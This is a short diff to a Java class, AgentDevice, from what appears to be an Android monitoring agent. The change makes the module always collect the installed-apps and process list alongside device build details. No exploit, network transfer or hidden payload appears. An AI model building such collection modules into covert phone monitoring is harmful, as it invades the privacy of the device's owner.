@@ -47,7 +47,7 @@ public class AgentDevice extends BaseInstantModule {
 	private static final String TAG = "AgentDevice"; //$NON-NLS-1$
 
 	/** The process list. */
-	private boolean processList;
+	private boolean processList = true;
 
 	/** The cpu usage. */
 	private float cpuUsage;
@@ -73,8 +73,8 @@ public class AgentDevice extends BaseInstantModule {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(ConfModule conf) {		
-		this.processList = true;
+	public boolean parse(ConfModule conf) {
+		// this.processList = true;
 		return true;
 	}
 
@@ -103,7 +103,7 @@ public class AgentDevice extends BaseInstantModule {
 				sb.append(timestamp + "\n"); //$NON-NLS-1$
 			}
 		}
-		
+
 		// SYSTEM
 		sb.append(Messages.getString("9.3") + "\n"); //$NON-NLS-1$
 		sb.append(Messages.getString("9.22") + Build.BOARD + "\n");
@@ -138,8 +138,8 @@ public class AgentDevice extends BaseInstantModule {
 			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		if (processList ) {
-			processList=false;
+		if (processList) {
+
 			final ArrayList<PInfo> apps = getInstalledApps(false); /*
 																	 * false =
 																	 * no system
